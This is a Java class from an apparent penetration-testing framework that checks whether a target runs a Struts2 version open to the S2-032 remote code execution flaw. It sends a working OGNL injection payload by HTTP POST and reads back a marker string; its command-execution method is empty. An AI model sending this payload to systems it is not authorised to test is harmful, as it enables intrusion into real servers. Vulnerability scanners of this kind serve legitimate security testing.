package com.orleven.tentacle.permeate.script;

import java.net.URLEncoder;

import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.define.Message;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 032
 * @author orleven
 * @date 2017年3月19日
 */
@Component
@Scope("prototype")
public class Struts2RCE032 extends WebScriptBase{
	
	public Struts2RCE032(){
		super();
	}
	
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String provePayload1 = "method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close";
		String provePayload2 = "&tag=The Struts2-032 Remote Code Execution Is Exist!";
		String proveFlag1 = "The Struts2-032 Remote Code Execution Is Exist!";
		String proveFlag2 = "tag=The Struts2-032 Remote Code Execution Is Exist!";
		String result = "";

		result = WebUtil.getResponseBody(WebUtil.httpPost(getTargetUrl(), getHttpHeaders(),URLEncoder.encode(provePayload1).replace("+","%20")+provePayload2));
		if (result==null) {
			result = Message.notAvailable;
			getVulnerBean().setIsVulner(Permeate.isNotVerified);
		}else if(result.indexOf(proveFlag1)>=0&&result.indexOf(proveFlag2)<0){
			getVulnerBean().setIsVulner(Permeate.isVulner);
		}
		else{
			getVulnerBean().setIsVulner(Permeate.isNotVulner);
		}
		proveBean.setReceiveMessage(result);
		proveBean.setSendMessage(URLEncoder.encode(provePayload1).replace("+","%20")+provePayload2);
		getVulnerBean().getProveBean().add(proveBean);
		
	}
	
	@Override
	public void execCommand(String command) {
		
	}
}
